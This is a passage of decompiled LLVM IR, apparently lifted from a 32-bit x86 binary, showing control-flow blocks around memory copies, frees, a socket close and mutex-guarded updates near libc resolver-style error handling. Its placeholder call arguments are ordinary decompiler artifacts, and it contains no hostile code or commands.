dec_label_pc_8065289:                             ; preds = %dec_label_pc_8065281
  %v1_8065289 = add i32 %v0_806527a, 100
  %v2_8065289 = inttoptr i32 %v1_8065289 to i32*
  %v3_8065289 = load i32, i32* %v2_8065289, align 4
  %v4_8065289 = icmp eq i32 %v3_8065289, 0
  br i1 %v4_8065289, label %dec_label_pc_806542c, label %dec_label_pc_806539a

dec_label_pc_8065299:                             ; preds = %dec_label_pc_8065266
  %v1_8065299 = add i32 %v0_806527a, 43
  %v2_8065299 = inttoptr i32 %v1_8065299 to i8*
  %v3_8065299 = load i8, i8* %v2_8065299, align 1
  %v4_8065299 = icmp eq i8 %v3_8065299, 0
  br i1 %v4_8065299, label %dec_label_pc_806533a, label %dec_label_pc_80652a4

dec_label_pc_80652a4:                             ; preds = %dec_label_pc_8065299
  %v0_80652a4 = load i32, i32* @edi, align 4
  %v1_80652a4 = add i32 %v0_80652a4, 28
  %v2_80652a4 = inttoptr i32 %v1_80652a4 to i32*
  %v3_80652a4 = load i32, i32* %v2_80652a4, align 4
  store i32 %v3_80652a4, i32* %eax.global-to-local, align 4
  %v2_80652a7 = add i32 %v0_806527a, 160
  %v3_80652a7 = inttoptr i32 %v2_80652a7 to i32*
  store i32 %v3_80652a4, i32* %v3_80652a7, align 4
  %v0_80652ae = load i32, i32* @edi, align 4
  %v1_80652ae = add i32 %v0_80652ae, 32
  %v2_80652ae = inttoptr i32 %v1_80652ae to i32*
  %v3_80652ae = load i32, i32* %v2_80652ae, align 4
  store i32 %v3_80652ae, i32* %eax.global-to-local, align 4
  %v1_80652b1 = load i32, i32* @esp, align 4
  %v2_80652b1 = add i32 %v1_80652b1, 148
  %v3_80652b1 = inttoptr i32 %v2_80652b1 to i32*
  store i32 %v3_80652ae, i32* %v3_80652b1, align 4
  %v0_80652b8 = load i32, i32* @edi, align 4
  %v1_80652b8 = add i32 %v0_80652b8, 36
  %v2_80652b8 = inttoptr i32 %v1_80652b8 to i32*
  %v3_80652b8 = load i32, i32* %v2_80652b8, align 4
  store i32 %v3_80652b8, i32* %eax.global-to-local, align 4
  %v1_80652bb = load i32, i32* @esp, align 4
  %v2_80652bb = add i32 %v1_80652bb, 152
  %v3_80652bb = inttoptr i32 %v2_80652bb to i32*
  store i32 %v3_80652b8, i32* %v3_80652bb, align 4
  %v0_80652c2 = load i32, i32* @ecx, align 4
  %v1_80652c2 = load i32, i32* @esp, align 4
  %v2_80652c2 = add i32 %v1_80652c2, -4
  %v3_80652c2 = inttoptr i32 %v2_80652c2 to i32*
  store i32 %v0_80652c2, i32* %v3_80652c2, align 4
  %v1_80652c3 = add i32 %v1_80652c2, -8
  %v2_80652c3 = inttoptr i32 %v1_80652c3 to i32*
  store i32 40, i32* %v2_80652c3, align 4
  %v1_80652c5 = add i32 %v1_80652c2, 116
  store i32 %v1_80652c5, i32* %edx.global-to-local, align 4
  %v2_80652c9 = add i32 %v1_80652c2, -12
  %v3_80652c9 = inttoptr i32 %v2_80652c9 to i32*
  store i32 %v1_80652c5, i32* %v3_80652c9, align 4
  %v0_80652ca = load i32, i32* @edi, align 4
  %v2_80652ca = add i32 %v1_80652c2, -16
  %v3_80652ca = inttoptr i32 %v2_80652ca to i32*
  store i32 %v0_80652ca, i32* %v3_80652ca, align 4
  %v5_80652cb = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_80652cb, i32* %eax.global-to-local, align 4
  %v0_80652d0 = load i32, i32* @edi, align 4
  %v1_80652d0 = add i32 %v0_80652d0, 4
  %v2_80652d0 = inttoptr i32 %v1_80652d0 to i32*
  %v3_80652d0 = load i32, i32* %v2_80652d0, align 4
  store i32 %v3_80652d0, i32* %eax.global-to-local, align 4
  %v0_80652d3 = load i32, i32* @esp, align 4
  %v1_80652d3 = add i32 %v0_80652d3, 16
  %v9_80652d6 = icmp eq i32 %v3_80652d0, 24
  br i1 %v9_80652d6, label %dec_label_pc_80652a4.dec_label_pc_80652fd_crit_edge, label %dec_label_pc_80652db

dec_label_pc_80652a4.dec_label_pc_80652fd_crit_edge: ; preds = %dec_label_pc_80652a4
  %.pre28 = add i32 %v0_80652d3, 260
  %.pre29 = inttoptr i32 %.pre28 to i32*
  %v4_80652fd.pre = load i32, i32* %.pre29, align 4
  br label %dec_label_pc_80652fd

dec_label_pc_80652db:                             ; preds = %dec_label_pc_80652a4
  %v1_80652db = add i32 %v0_80652d0, 28
  %v2_80652db = inttoptr i32 %v1_80652db to i32*
  %v3_80652db = load i32, i32* %v2_80652db, align 4
  %v4_80652db = icmp eq i32 %v3_80652db, 0
  br i1 %v4_80652db, label %dec_label_pc_806539a, label %dec_label_pc_80652e5

dec_label_pc_80652e5:                             ; preds = %dec_label_pc_80652db
  %v1_80652e5 = add i32 %v0_80652d3, 260
  %v2_80652e5 = inttoptr i32 %v1_80652e5 to i32*
  %v3_80652e5 = load i32, i32* %v2_80652e5, align 4
  %v12_80652e5 = icmp eq i32 %v3_80652e5, 1
  br i1 %v12_80652e5, label %dec_label_pc_80652fd, label %dec_label_pc_80652ef

dec_label_pc_80652ef:                             ; preds = %dec_label_pc_80652e5
  %v12_80652ef = icmp eq i32 %v3_80652e5, 28
  %v1_80652f7 = icmp eq i1 %v12_80652ef, false
  br i1 %v1_80652f7, label %dec_label_pc_806539a, label %dec_label_pc_80652fd

dec_label_pc_80652fd:                             ; preds = %dec_label_pc_80652a4.dec_label_pc_80652fd_crit_edge, %dec_label_pc_80652ef, %dec_label_pc_80652e5
  %v4_80652fd = phi i32 [ %v4_80652fd.pre, %dec_label_pc_80652a4.dec_label_pc_80652fd_crit_edge ], [ %v3_80652e5, %dec_label_pc_80652ef ], [ 1, %dec_label_pc_80652e5 ]
  %v15_80652fd = icmp eq i32 %v3_80652d0, %v4_80652fd
  br i1 %v15_80652fd, label %dec_label_pc_8065312, label %dec_label_pc_8065306

dec_label_pc_8065306:                             ; preds = %dec_label_pc_80652fd
  %v1_8065309 = inttoptr i32 %v0_80652d0 to i32*
  %v2_8065309 = load i32, i32* %v1_8065309, align 4
  %v5_8065309 = inttoptr i32 %v0_80652d3 to i32*
  store i32 %v2_8065309, i32* %v5_8065309, align 4
  %v1_806530b = call i32 @free(i32 -1)
  store i32 %v1_806530b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065382

dec_label_pc_8065312:                             ; preds = %dec_label_pc_80652fd
  %v0_8065312 = load i32, i32* @ebx, align 4
  %v1_8065314 = sub i32 -1, %v0_8065312
  store i32 %v1_8065314, i32* %eax.global-to-local, align 4
  %v2_8065316 = add i32 %v0_80652d3, 120
  %v3_8065316 = inttoptr i32 %v2_8065316 to i32*
  %v4_8065316 = load i32, i32* %v3_8065316, align 4
  %v5_8065316 = add i32 %v4_8065316, %v1_8065314
  store i32 %v5_8065316, i32* %eax.global-to-local, align 4
  %v2_806531a = add i32 %v0_80652d0, 36
  %v3_806531a = inttoptr i32 %v2_806531a to i32*
  store i32 %v5_8065316, i32* %v3_806531a, align 4
  %v0_806531d = load i32, i32* @edi, align 4
  %v1_806531d = add i32 %v0_806531d, 16
  %v2_806531d = inttoptr i32 %v1_806531d to i32*
  %v3_806531d = load i32, i32* %v2_806531d, align 4
  %v1_8065320 = add i32 %v3_806531d, 4
  store i32 %v1_8065320, i32* %eax.global-to-local, align 4
  %v2_8065323 = add i32 %v0_806531d, 36
  %v3_8065323 = inttoptr i32 %v2_8065323 to i32*
  %v4_8065323 = load i32, i32* %v3_8065323, align 4
  %v7_8065323 = mul i32 %v4_8065323, %v1_8065320
  store i32 %v7_8065323, i32* %eax.global-to-local, align 4
  %v2_8065327 = add i32 %v0_806531d, 32
  %v3_8065327 = inttoptr i32 %v2_8065327 to i32*
  %v4_8065327 = load i32, i32* %v3_8065327, align 4
  %v6_806532a = icmp ugt i32 %v7_8065323, %v4_8065327
  br i1 %v6_806532a, label %dec_label_pc_8065312.dec_label_pc_806539a.loopexit_crit_edge, label %dec_label_pc_806532c

dec_label_pc_8065312.dec_label_pc_806539a.loopexit_crit_edge: ; preds = %dec_label_pc_8065312
  %v0_806539a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806539a

dec_label_pc_806532c:                             ; preds = %dec_label_pc_8065312
  store i32 0, i32* %v3_8065323, align 4
  %v0_8065333 = load i32, i32* @esp, align 4
  %v1_8065333 = add i32 %v0_8065333, 27
  %v2_8065333 = inttoptr i32 %v1_8065333 to i8*
  store i8 0, i8* %v2_8065333, align 1
  %v1_8065385.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065385

dec_label_pc_806533a:                             ; preds = %dec_label_pc_8065299
  %v1_806533d = add i32 %v0_806527a, 132
  %v2_806533d = inttoptr i32 %v1_806533d to i32*
  %v3_806533d = load i32, i32* %v2_806533d, align 4
  %v6_806533d = inttoptr i32 %v0_806527a to i32*
  store i32 %v3_806533d, i32* %v6_806533d, align 4
  %v1_8065344 = call i32 @free(i32 -1)
  store i32 %v1_8065344, i32* %eax.global-to-local, align 4
  %v0_8065349 = load i32, i32* @esp, align 4
  %v1_8065349 = add i32 %v0_8065349, 16
  %v1_806534c = add i32 %v0_8065349, 260
  %v2_806534c = inttoptr i32 %v1_806534c to i32*
  %v3_806534c = load i32, i32* %v2_806534c, align 4
  store i32 %v3_806534c, i32* %eax.global-to-local, align 4
  %v1_8065353 = add i32 %v0_8065349, 136
  %v2_8065353 = inttoptr i32 %v1_8065353 to i32*
  %v3_8065353 = load i32, i32* %v2_8065353, align 4
  %v15_8065353 = icmp eq i32 %v3_8065353, %v3_806534c
  %v1_8065357 = icmp eq i1 %v15_8065353, false
  br i1 %v1_8065357, label %dec_label_pc_8065385, label %dec_label_pc_8065359

dec_label_pc_8065359:                             ; preds = %dec_label_pc_806533a
  %v0_8065359 = load i32, i32* @edi, align 4
  %v1_8065359 = add i32 %v0_8065359, 16
  %v2_8065359 = inttoptr i32 %v1_8065359 to i32*
  %v3_8065359 = load i32, i32* %v2_8065359, align 4
  store i32 %v3_8065359, i32* %eax.global-to-local, align 4
  %v2_806535c = add i32 %v0_8065349, 148
  %v3_806535c = inttoptr i32 %v2_806535c to i32*
  %v4_806535c = load i32, i32* %v3_806535c, align 4
  %v15_806535c = icmp eq i32 %v3_8065359, %v4_806535c
  %v1_8065363 = icmp eq i1 %v15_806535c, false
  br i1 %v1_8065363, label %dec_label_pc_806541f, label %dec_label_pc_8065369

dec_label_pc_8065369:                             ; preds = %dec_label_pc_8065359
  %v0_8065369 = load i32, i32* @edx, align 4
  %v2_8065369 = add i32 %v0_8065349, 12
  %v3_8065369 = inttoptr i32 %v2_8065369 to i32*
  store i32 %v0_8065369, i32* %v3_8065369, align 4
  %v0_806536a = load i32, i32* %eax.global-to-local, align 4
  %v2_806536a = add i32 %v0_8065349, 8
  %v3_806536a = inttoptr i32 %v2_806536a to i32*
  store i32 %v0_806536a, i32* %v3_806536a, align 4
  %v1_806536b = add i32 %v0_8065349, 152
  %v2_806536b = inttoptr i32 %v1_806536b to i32*
  %v3_806536b = load i32, i32* %v2_806536b, align 4
  %v5_806536b = add i32 %v0_8065349, 4
  %v6_806536b = inttoptr i32 %v5_806536b to i32*
  store i32 %v3_806536b, i32* %v6_806536b, align 4
  %v0_8065372 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065372 = load i32, i32* @edi, align 4
  %v2_8065372 = add i32 %v1_8065372, 36
  %v3_8065372 = inttoptr i32 %v2_8065372 to i32*
  %v4_8065372 = load i32, i32* %v3_8065372, align 4
  %v7_8065372 = mul i32 %v4_8065372, %v0_8065372
  store i32 %v7_8065372, i32* %eax.global-to-local, align 4
  %v2_8065376 = add i32 %v1_8065372, 28
  %v3_8065376 = inttoptr i32 %v2_8065376 to i32*
  %v4_8065376 = load i32, i32* %v3_8065376, align 4
  %v5_8065376 = add i32 %v4_8065376, %v7_8065372
  store i32 %v5_8065376, i32* %eax.global-to-local, align 4
  %v3_8065379 = inttoptr i32 %v0_8065349 to i32*
  store i32 %v5_8065376, i32* %v3_8065379, align 4
  %v5_806537a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_806537a, i32* %eax.global-to-local, align 4
  %v0_806537f = load i32, i32* @edi, align 4
  %v1_806537f = add i32 %v0_806537f, 36
  %v2_806537f = inttoptr i32 %v1_806537f to i32*
  %v3_806537f = load i32, i32* %v2_806537f, align 4
  %v4_806537f = add i32 %v3_806537f, 1
  store i32 %v4_806537f, i32* %v2_806537f, align 4
  br label %dec_label_pc_8065382

dec_label_pc_8065382:                             ; preds = %dec_label_pc_8065306, %dec_label_pc_8065369
  %v0_8065382 = load i32, i32* @esp, align 4
  %v1_8065382 = add i32 %v0_8065382, 16
  br label %dec_label_pc_8065385

dec_label_pc_8065385:                             ; preds = %dec_label_pc_806533a, %dec_label_pc_806532c, %dec_label_pc_8065382
  %v1_8065385 = phi i32 [ %v1_8065349, %dec_label_pc_806533a ], [ %v1_8065385.pre, %dec_label_pc_806532c ], [ %v1_8065382, %dec_label_pc_8065382 ]
  %v0_8065385 = load i32, i32* @esi, align 4
  %v2_8065385 = add i32 %v1_8065385, 52
  %v3_8065385 = inttoptr i32 %v2_8065385 to i32*
  %v4_8065385 = load i32, i32* %v3_8065385, align 4
  %v5_8065385 = add i32 %v4_8065385, %v0_8065385
  store i32 %v5_8065385, i32* @esi, align 4
  %v0_8065389 = load i32, i32* @ebx, align 4
  %v1_8065389 = add i32 %v0_8065389, 1
  store i32 %v1_8065389, i32* @ebx, align 4
  %v2_806538a = add i32 %v1_8065385, 104
  %v3_806538a = inttoptr i32 %v2_806538a to i32*
  %v4_806538a = load i32, i32* %v3_806538a, align 4
  %v5_806538a = sub i32 %v1_8065389, %v4_806538a
  %v11_806538a = xor i32 %v4_806538a, %v1_8065389
  %v12_806538a = xor i32 %v5_806538a, %v1_8065389
  %v13_806538a = and i32 %v12_806538a, %v11_806538a
  %v14_806538a = icmp slt i32 %v13_806538a, 0
  %v16_806538a = icmp slt i32 %v5_806538a, 0
  %v2_806538e = icmp eq i1 %v16_806538a, %v14_806538a
  br i1 %v2_806538e, label %dec_label_pc_806539a, label %dec_label_pc_8065390

dec_label_pc_8065390:                             ; preds = %dec_label_pc_8065390.lr.ph, %dec_label_pc_8065385
  %v0_8065390 = phi i32 [ %v0_8065390.pre, %dec_label_pc_8065390.lr.ph ], [ %v5_8065385, %dec_label_pc_8065385 ]
  %v0_806526685 = phi i32 [ %v1_806538a.pre, %dec_label_pc_8065390.lr.ph ], [ %v1_8065385, %dec_label_pc_8065385 ]
  %v2_8065390 = add i32 %v0_806526685, 16
  %v3_8065390 = inttoptr i32 %v2_8065390 to i32*
  %v4_8065390 = load i32, i32* %v3_8065390, align 4
  %v5_8065390 = sub i32 %v0_8065390, %v4_8065390
  %v11_8065390 = xor i32 %v4_8065390, %v0_8065390
  %v12_8065390 = xor i32 %v5_8065390, %v0_8065390
  %v13_8065390 = and i32 %v12_8065390, %v11_8065390
  %v14_8065390 = icmp slt i32 %v13_8065390, 0
  %v16_8065390 = icmp slt i32 %v5_8065390, 0
  %v2_8065394 = icmp eq i1 %v16_8065390, %v14_8065390
  br i1 %v2_8065394, label %dec_label_pc_806539a, label %dec_label_pc_8065266

dec_label_pc_806539a:                             ; preds = %dec_label_pc_8065289, %dec_label_pc_806525a, %dec_label_pc_8065385, %dec_label_pc_80652db, %dec_label_pc_80652ef, %dec_label_pc_8065390, %dec_label_pc_8065312.dec_label_pc_806539a.loopexit_crit_edge
  %v0_806539a = phi i32 [ %v0_806539a.pre.pre, %dec_label_pc_8065312.dec_label_pc_806539a.loopexit_crit_edge ], [ %v1_806538a.pre, %dec_label_pc_806525a ], [ %v1_8065385, %dec_label_pc_8065385 ], [ %v1_80652d3, %dec_label_pc_80652db ], [ %v1_80652d3, %dec_label_pc_80652ef ], [ %v0_806526685, %dec_label_pc_8065390 ], [ %v1_806527a, %dec_label_pc_8065289 ]
  %v1_806539d = add i32 %v0_806539a, 20
  %v2_806539d = inttoptr i32 %v1_806539d to i32*
  %v3_806539d = load i32, i32* %v2_806539d, align 4
  %v5_806539d = add i32 %v0_806539a, -16
  %v6_806539d = inttoptr i32 %v5_806539d to i32*
  store i32 %v3_806539d, i32* %v6_806539d, align 4
  %v1_80653a1 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80653a1, i32* %eax.global-to-local, align 4
  %v0_80653a6 = load i32, i32* @esp, align 4
  %v1_80653a9 = add i32 %v0_80653a6, 272
  %v2_80653a9 = inttoptr i32 %v1_80653a9 to i32*
  %v3_80653a9 = load i32, i32* %v2_80653a9, align 4
  %v4_80653a9 = icmp eq i32 %v3_80653a9, 0
  br i1 %v4_80653a9, label %dec_label_pc_80653be, label %dec_label_pc_80653b3

dec_label_pc_80653b3:                             ; preds = %dec_label_pc_806539a
  store i32 %v3_80653a9, i32* %edx.global-to-local, align 4
  %v2_80653ba = inttoptr i32 %v3_80653a9 to i32*
  store i32 %v2_8064e2a, i32* %v2_80653ba, align 4
  %v0_80653ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80653ca

dec_label_pc_80653be:                             ; preds = %dec_label_pc_806539a
  %v3_80653c1 = inttoptr i32 %v0_80653a6 to i32*
  store i32 %v2_8064e2a, i32* %v3_80653c1, align 4
  %v1_80653c2 = call i32 @free(i32 -1)
  store i32 %v1_80653c2, i32* %eax.global-to-local, align 4
  %v0_80653c7 = load i32, i32* @esp, align 4
  %v1_80653c7 = add i32 %v0_80653c7, 16
  br label %dec_label_pc_80653ca

dec_label_pc_80653ca:                             ; preds = %dec_label_pc_80653b3, %dec_label_pc_80653be
  %v0_80653ca = phi i32 [ %v0_80653ca.pre, %dec_label_pc_80653b3 ], [ %v1_80653c7, %dec_label_pc_80653be ]
  %v1_80653cd = add i32 %v0_80653ca, 12
  %v2_80653cd = inttoptr i32 %v1_80653cd to i32*
  %v3_80653cd = load i32, i32* %v2_80653cd, align 4
  %v5_80653cd = add i32 %v0_80653ca, -16
  %v6_80653cd = inttoptr i32 %v5_80653cd to i32*
  store i32 %v3_80653cd, i32* %v6_80653cd, align 4
  %v1_80653d1 = call i32 @free(i32 -1)
  store i32 %v1_80653d1, i32* %eax.global-to-local, align 4
  %v0_80653d6 = load i32, i32* @esp, align 4
  %v1_80653d9 = add i32 %v0_80653d6, 8
  %v2_80653d9 = inttoptr i32 %v1_80653d9 to i32*
  store i32 ptrtoint (i8** @global_var_807ca1c.880 to i32), i32* %v2_80653d9, align 4
  %v1_80653de = add i32 %v0_80653d6, 4
  %v2_80653de = inttoptr i32 %v1_80653de to i32*
  store i32 134583465, i32* %v2_80653de, align 4
  %v1_80653e3 = add i32 %v0_80653d6, 200
  store i32 %v1_80653e3, i32* @ebx, align 4
  %v3_80653ea = inttoptr i32 %v0_80653d6 to i32*
  store i32 %v1_80653e3, i32* %v3_80653ea, align 4
  %v5_80653eb = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_80653eb, i32* %eax.global-to-local, align 4
  %v0_80653f0 = load i32, i32* @esp, align 4
  %v1_80653f0 = inttoptr i32 %v0_80653f0 to i32*
  store i32 ptrtoint (i8** @global_var_807ca1c.880 to i32), i32* %v1_80653f0, align 4
  %v1_80653f7 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_80653f7, i32* %eax.global-to-local, align 4
  %v0_80653fc = load i32, i32* @esp, align 4
  %v1_80653fc = add i32 %v0_80653fc, 56
  %v2_80653fc = inttoptr i32 %v1_80653fc to i32*
  %v3_80653fc = load i32, i32* %v2_80653fc, align 4
  store i32 %v3_80653fc, i32* %eax.global-to-local, align 4
  %v1_8065400 = add i32 %v0_80653fc, 72
  %v2_8065400 = inttoptr i32 %v1_8065400 to i32*
  %v3_8065400 = load i32, i32* %v2_8065400, align 4
  store i32 %v3_8065400, i32* %edx.global-to-local, align 4
  %v1_8065404 = inttoptr i32 %v0_80653fc to i32*
  %v3_8065404 = add i32 %v0_80653fc, 4
  %v1_8065405 = inttoptr i32 %v3_8065404 to i32*
  %v2_8065405 = load i32, i32* %v1_8065405, align 4
  store i32 %v2_8065405, i32* @edi, align 4
  store i32 1, i32* %v1_8065405, align 4
  %v0_8065408 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065408 = sext i32 %v0_8065408 to i64
  store i64 %v1_8065408, i64* @global_var_807ca34.881, align 8
  %v0_806540d = load i32, i32* %edx.global-to-local, align 4
  %v1_806540d = trunc i32 %v0_806540d to i16
  store i16 %v1_806540d, i16* @global_var_8074008.882, align 8
  %v0_8065414 = load i32, i32* @ebx, align 4
  store i32 %v0_8065414, i32* %v1_8065404, align 4
  %v3_8065415 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8)
  store i32 %v3_8065415, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065556

dec_label_pc_806541f:                             ; preds = %dec_label_pc_8065359
  %v1_8065422 = inttoptr i32 %v0_8065359 to i32*
  %v2_8065422 = load i32, i32* %v1_8065422, align 4
  %v5_8065422 = inttoptr i32 %v0_8065349 to i32*
  store i32 %v2_8065422, i32* %v5_8065422, align 4
  %v1_8065424 = call i32 @free(i32 -1)
  store i32 %v1_8065424, i32* %eax.global-to-local, align 4
  %v0_8065429 = load i32, i32* @esp, align 4
  %v1_8065429 = add i32 %v0_8065429, 16
  br label %dec_label_pc_806542c

dec_label_pc_806542c:                             ; preds = %dec_label_pc_806515e, %dec_label_pc_8065289, %dec_label_pc_8065281, %dec_label_pc_806521d, %dec_label_pc_80651a3, %dec_label_pc_806517f, %dec_label_pc_806541f
  %v1_8065433 = phi i32 [ %v1_8065173, %dec_label_pc_806515e ], [ %v1_806527a, %dec_label_pc_8065289 ], [ %v1_806527a, %dec_label_pc_8065281 ], [ %v1_8065194, %dec_label_pc_806521d ], [ %v1_8065194, %dec_label_pc_80651a3 ], [ %v1_8065194, %dec_label_pc_806517f ], [ %v1_8065429, %dec_label_pc_806541f ]
  %v1_806542c = add i32 %v1_8065433, 51
  %v2_806542c = inttoptr i32 %v1_806542c to i8*
  %v3_806542c = load i8, i8* %v2_806542c, align 1
  %v4_806542c = icmp eq i8 %v3_806542c, 0
  %v1_8065431 = icmp eq i1 %v4_806542c, false
  br i1 %v1_8065431, label %dec_label_pc_8065477, label %dec_label_pc_8065433

dec_label_pc_8065433:                             ; preds = %dec_label_pc_806542c
  %v0_8065433 = load i32, i32* @ecx, align 4
  %v2_8065433 = add i32 %v1_8065433, -4
  %v3_8065433 = inttoptr i32 %v2_8065433 to i32*
  store i32 %v0_8065433, i32* %v3_8065433, align 4
  %v1_8065434 = add i32 %v1_8065433, -8
  %v2_8065434 = inttoptr i32 %v1_8065434 to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v2_8065434, align 4
  %v1_8065439 = add i32 %v1_8065433, -12
  %v2_8065439 = inttoptr i32 %v1_8065439 to i32*
  store i32 134583465, i32* %v2_8065439, align 4
  %v1_806543e = add i32 %v1_8065433, 184
  store i32 %v1_806543e, i32* @esi, align 4
  %v2_8065445 = add i32 %v1_8065433, -16
  %v3_8065445 = inttoptr i32 %v2_8065445 to i32*
  store i32 %v1_806543e, i32* %v3_8065445, align 4
  %v5_8065446 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8, i32 %v3_8064f17)
  store i32 %v5_8065446, i32* %eax.global-to-local, align 4
  %v0_806544b = load i32, i32* @esp, align 4
  %v1_806544b = inttoptr i32 %v0_806544b to i32*
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %v1_806544b, align 4
  %v1_8065452 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065452, i32* %eax.global-to-local, align 4
  %v0_8065457 = load i32, i32* @esp, align 4
  %v1_8065457 = inttoptr i32 %v0_8065457 to i32*
  %v2_8065457 = load i32, i32* %v1_8065457, align 4
  store i32 %v2_8065457, i32* %eax.global-to-local, align 4
  %v3_8065457 = add i32 %v0_8065457, 4
  %v1_8065458 = inttoptr i32 %v3_8065457 to i32*
  %v2_8065458 = load i32, i32* %v1_8065458, align 4
  store i32 %v2_8065458, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8065458, align 4
  %v0_806545b = load i32, i32* @esi, align 4
  store i32 %v0_806545b, i32* %v1_8065457, align 4
  %v0_806545c = load i32, i32* @global_var_807e564.883, align 4
  store i32 %v0_806545c, i32* @ebx, align 4
  %v3_8065462 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8064eb8)
  store i32 %v3_8065462, i32* %eax.global-to-local, align 4
  %v0_8065467 = load i32, i32* @esp, align 4
  %v1_8065467 = add i32 %v0_8065467, 16
  %v0_806546a = load i32, i32* @ebx, align 4
  %v1_806546a = add i32 %v0_806546a, -1
  store i32 %v1_806546a, i32* @ebx, align 4
  %v1_806546b = add i32 %v0_8065467, 52
  %v2_806546b = inttoptr i32 %v1_806546b to i32*
  %v3_806546b = load i32, i32* %v2_806546b, align 4
  %v5_806546b = sub i32 %v3_806546b, %v1_806546a
  %v11_806546b = xor i32 %v3_806546b, %v1_806546a
  %v12_806546b = xor i32 %v5_806546b, %v3_806546b
  %v13_806546b = and i32 %v12_806546b, %v11_806546b
  %v14_806546b = icmp slt i32 %v13_806546b, 0
  %v16_806546b = icmp slt i32 %v5_806546b, 0
  %v2_806546f = icmp eq i1 %v16_806546b, %v14_806546b
  br i1 %v2_806546f, label %dec_label_pc_8065477, label %dec_label_pc_8065471

dec_label_pc_8065471:                             ; preds = %dec_label_pc_8065433
  %v4_8065471 = add i32 %v3_806546b, 1
  store i32 %v4_8065471, i32* %v2_806546b, align 4
  br label %dec_label_pc_8065498.backedge

dec_label_pc_8065477:                             ; preds = %dec_label_pc_8065100, %dec_label_pc_8065433, %dec_label_pc_806542c, %dec_label_pc_8065117
  %v1_8065484 = phi i32 [ %v1_8065467, %dec_label_pc_8065433 ], [ %v1_8065433, %dec_label_pc_806542c ], [ %v1_8065153, %dec_label_pc_8065117 ], [ %v0_8065477.pre, %dec_label_pc_8065100 ]
  %v1_8065477 = add i32 %v1_8065484, 40
  %v2_8065477 = inttoptr i32 %v1_8065477 to i32*
  %v3_8065477 = load i32, i32* %v2_8065477, align 4
  %v1_806547b = add i32 %v3_8065477, 1
  store i32 %v1_806547b, i32* %eax.global-to-local, align 4
  %v1_806547c = ashr i32 %v1_806547b, 31
  store i32 %v1_806547c, i32* %edx.global-to-local, align 4
  %v1_806547d = add i32 %v1_8065484, 248
  %v2_806547d = inttoptr i32 %v1_806547d to i32*
  %v3_806547d = load i32, i32* %v2_806547d, align 4
  %v5_806547d = zext i32 %v1_806547b to i64
  %v7_806547d = zext i32 %v1_806547c to i64
  %v8_806547d = mul nuw i64 %v7_806547d, 4294967296
  %v9_806547d = or i64 %v8_806547d, %v5_806547d
  %v10_806547d = zext i32 %v3_806547d to i64
  %v11_806547d = sdiv i64 %v9_806547d, %v10_806547d
  %v12_806547d = trunc i64 %v11_806547d to i32
  store i32 %v12_806547d, i32* %eax.global-to-local, align 4
  %v13_806547d = srem i64 %v9_806547d, %v10_806547d
  %v14_806547d = trunc i64 %v13_806547d to i32
  store i32 %v14_806547d, i32* %edx.global-to-local, align 4
  store i32 %v14_806547d, i32* %v2_8065477, align 4
  %v1_8065488 = icmp eq i32 %v14_806547d, 0
  %v1_806548a = icmp eq i1 %v1_8065488, false
  br i1 %v1_806548a, label %dec_label_pc_8065490, label %dec_label_pc_806548c

dec_label_pc_806548c:                             ; preds = %dec_label_pc_8065477
  %v0_806548c = load i32, i32* @esp, align 4
  %v1_806548c = add i32 %v0_806548c, 28
  %v2_806548c = inttoptr i32 %v1_806548c to i32*
  %v3_806548c = load i32, i32* %v2_806548c, align 4
  %v4_806548c = add i32 %v3_806548c, 1
  store i32 %v4_806548c, i32* %v2_806548c, align 4
  br label %dec_label_pc_8065490

dec_label_pc_8065490:                             ; preds = %dec_label_pc_8065477, %dec_label_pc_806548c
  %v0_8065490 = load i32, i32* @esp, align 4
  %v1_8065490 = add i32 %v0_8065490, 36
  %v2_8065490 = inttoptr i32 %v1_8065490 to i32*
  store i32 -1, i32* %v2_8065490, align 4
  br label %dec_label_pc_8065498.backedge

dec_label_pc_8065498.backedge:                    ; preds = %dec_label_pc_8065490, %dec_label_pc_806510e, %dec_label_pc_80651fc, %dec_label_pc_8065471
  %v0_8065498.pre = load i32, i32* @esp, align 4
  %v1_8065498 = add i32 %v0_8065498.pre, 28
  %v2_8065498 = inttoptr i32 %v1_8065498 to i32*
  %v3_8065498 = load i32, i32* %v2_8065498, align 4
  %tmp127 = icmp ult i32 %v3_8065498, 3
  br i1 %tmp127, label %dec_label_pc_8064ef8, label %dec_label_pc_80654bd

dec_label_pc_80654bd:                             ; preds = %dec_label_pc_8064e72, %dec_label_pc_8064f0e, %dec_label_pc_8065002, %dec_label_pc_8065498.backedge, %entry, %dec_label_pc_8064e4c, %dec_label_pc_8064e54, %dec_label_pc_8064e62
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8064e62 ], [ -1, %dec_label_pc_8064e54 ], [ -1, %dec_label_pc_8064e4c ], [ -1, %entry ], [ %v0_8064ebf, %dec_label_pc_8065498.backedge ], [ %v0_8064ebf, %dec_label_pc_8065002 ], [ %v0_8064ebf, %dec_label_pc_8064f0e ], [ %v0_8064ebf, %dec_label_pc_8064e72 ]
  %v0_80654bd = call i32 @__GI___h_errno_location()
